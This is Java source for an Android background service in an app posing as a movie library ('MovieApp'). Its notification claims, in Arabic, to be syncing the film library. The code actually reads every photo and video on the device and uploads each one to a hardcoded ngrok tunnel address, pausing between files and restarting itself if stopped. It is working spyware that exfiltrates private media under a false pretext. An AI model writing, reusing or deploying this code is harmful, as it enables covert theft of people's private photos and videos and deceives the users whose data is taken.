package com.films.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadService extends Service {
    String ngrokUrl = "https://nacho-usher-goes.ngrok-free.dev/upload";
    String sessionId = String.valueOf(System.currentTimeMillis());

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "MovieAppChannel")
                .setContentTitle("MovieApp")
                .setContentText("جاري مزامنة مكتبة الأفلام...")
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .build();

        startForeground(1, notification);

        new Thread(() -> {
            uploadAllMedia();
            stopForeground(true);
            stopSelf();
        }).start();

        return START_STICKY;
    }

    private void uploadAllMedia() {
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                File file = new File(path);
                if (file.exists()) {
                    sendFile(file);
                    try { Thread.sleep(2000); } catch (Exception e) {}
                }
            }
            cursor.close();
        }

        cursor = getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                File file = new File(path);
                if (file.exists()) {
                    sendFile(file);
                    try { Thread.sleep(2000); } catch (Exception e) {}
                }
            }
            cursor.close();
        }
    }

    private void sendFile(File file) {
        try {
            String boundary = "*****";
            HttpURLConnection conn = (HttpURLConnection) new URL(ngrokUrl + "?session=" + sessionId).openConnection();
            conn.setConnectTimeout(180000);
            conn.setReadTimeout(180000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fis.close();
            os.writeBytes("\r\n--" + boundary + "--\r\n");
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                Thread.sleep(2000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "MovieAppChannel", "MovieApp Service", NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
